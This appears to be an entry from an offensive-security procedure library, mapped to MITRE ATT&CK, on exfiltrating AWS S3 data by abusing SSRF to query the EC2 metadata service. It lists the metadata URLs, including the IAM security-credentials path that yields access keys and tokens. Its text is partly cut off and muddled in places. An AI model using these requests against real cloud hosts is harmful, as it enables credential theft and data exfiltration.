---
id: 6a3a44be-eea1-42c9-b949-db78e0392a67
name: AWS S3 Bucket Data Exfiltration
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:53.762350+00:00'
updated_at: '2023-04-06T03:55:53.777564+00:00'
tactics:
- '[[Collection|TA0009 - Collection]]'
techniques:
- '[[Data from Cloud Storage|T1530 - Data from Cloud Storage]]'
tags:
- '[[Amazon Bucket S3 AWS]]'
- '[[Bucket juicy data]]'
commands:
- '[[Fetch EC2 Instance Metadata]]'
---

# AWS S3 Bucket Data Exfiltration

## Summary

The AWS S3 Bucket Data Exfiltration procedure enables an attacker to retrieve sensitive data from an Amazon S3 bucket by exploiting an SSRF vulnerability that runs on EC2. The procedure involves querying an internal service that every EC2 instance can access for instance metadata about the host. If

## Description

# Description

The AWS S3 Bucket Data Exfiltration procedure enables an attacker to retrieve sensitive data from an Amazon S3 bucket by exploiting an SSRF vulnerability that runs on EC2. The procedure involves querying an internal service that every EC2 instance can access for instance metadata about the host. If the attacker has found an SSRF vulnerability, they can request the metadata and get access to the AccessKeyID, SecretAccessKey, and Token for the bucket. This information can be used to exfiltrate sensitive data from the bucket.

 

## Requirements

1. Access to an EC2 instance with an SSRF vulnerability

 

## Defense

1. Ensure the EC2 instances are running in a secure environment

1. Implement access controls and monitor access to S3 buckets

1. Use encryption to protect sensitive data in S3 buckets

 

## Objectives

1. Retrieve sensitive data from an Amazon S3 bucket

 

# Instructions

1. Execute the commands in a terminal on the EC2 instance with the SSRF vulnerability.

 



**Code**: [[http://169.254.169.254/latest/meta-data/
http://16]]



> The first command retrieves the instance metadata, the second command retrieves the user data, and the third command retrieves the AccessKeyID, SecretAccessKey, and Token for the IAM user role associated with the bucket. The fourth command retrieves the metadata for the PhotonInstance.



**Command** ([[Fetch EC2 Instance Metadata]]):

```bash
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE will return the AccessKeyID, SecretAccessKey, and Token
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
```



## MITRE ATT&CK Mapping

### Tactics

- [[Collection|TA0009 - Collection]]

### Techniques

- [[Data from Cloud Storage|T1530 - Data from Cloud Storage]]

## Commands Used

- [[Fetch EC2 Instance Metadata]]

## Tags

- [[Amazon Bucket S3 AWS]]
- [[Bucket juicy data]]


